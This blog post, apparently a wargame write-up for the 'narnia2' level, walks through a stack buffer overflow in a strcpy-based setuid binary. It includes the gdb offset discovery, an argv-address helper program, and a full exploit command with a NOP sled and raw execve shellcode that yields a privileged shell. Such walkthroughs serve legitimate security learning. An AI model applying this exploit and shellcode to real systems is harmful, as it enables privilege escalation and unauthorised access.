+++
title = "Narnia2"
date = "2026-03-10T10:47:47Z"
author = "0x4ngk4n"
draft = false
+++

Now its `narnia2`. It's been a while but yeah now continuing the series... Looking at the source code of /narnia/narnia3, it seems to be the case of a clear-cut stack-based buffer overflow. In this case, there is the vulnerable `strcpy` function which takes in user-controlled unsanitised buffer as the first argument. 

This is the corresponding code:

```c
int main(int argc, char *argv[]) {
	char buf[128];
	if (argc==1) {
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf, argv[1]); // the buffer overflow
	printf("%s", buf);

	return 0;
}
```


Loading the file in `gdb` I have the following output when I try to overflow and control the EIP:

```shell
Breakpoint 1, 0x08049189 in main ()
(gdb) c
Continuing.
Usage: /narnia/narnia2 argument
[Inferior 1 (process 92) exited with code 01]
(gdb) r $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*132 + b"BCDE")')
Starting program: /narnia/narnia2 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*132 + b"BCDE")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x08049189 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x45444342 in ?? () <- see the overwritten EIP?
```

Notice how after 132 characters, the `BCDE` are overwritten on the instruction pointer.
So, what can be done is I can control the EIP such that it lands on the shellcode positioned at a pre-determined memory address. There are numerous places to place the shellcode such as in environment var or even as part of the same argument which we provide to the binary.


The way I'll be exploiting is via the following arithmetic as part of the argv[1]: 
[pad with nop + shellcode=132 bytes] + [EIP 4bytes long at start of NOP sled]

Now, firstly, for the value of EIP, I need to know where exactly argv[1] starts...

The following helper program can be used:

```c
#include <stdio.h>

int main(int argc, char* argv[]){
	printf("arg at %p\n", argv[1]);
	return 0;
}
```

compile as:
```shell
gcc -m32 findargs.c -o findargs
```
Next, the program and its arguments need to match the exact length of the original pathname + filename and argument length. This is because they are aligned on the stack and the address of the argv[1] will vary accordingly.  

we can create files in the /tmp directory. we name the final compiled binary as `findargss`. This is because `/narnia/narnia2` and `/tmp/findargss` has the same character length of `14`.

Next, we find the argv[1] address:

```shell
narnia2@narnia:/tmp$ /tmp/findargss $(python3 -c 'import sys; sys.stdout.buffer.write(b"a"*136)')
arg at 0xffffd551
```

I will be using the shellcode from [shellcode-606](https://shell-storm.org/shellcode/files/shellcode-606.html). The length of this shellcode is 33 bytes. Thus our payload will look like:

[99 bytes NOP + 33 bytes SHELLCODE=132 bytes] + [`\x51\xd5\xff\xff`] <- The 4 bytes of EIP we got from above in little endian format.

Let's go...

```shell
narnia2@narnia:/tmp$ /narnia/narnia2 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*99+b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + b"\x51\xd5\xff\xff")')
bash-5.2$ id
uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14002(narnia2)
bash-5.2$
```

Done.
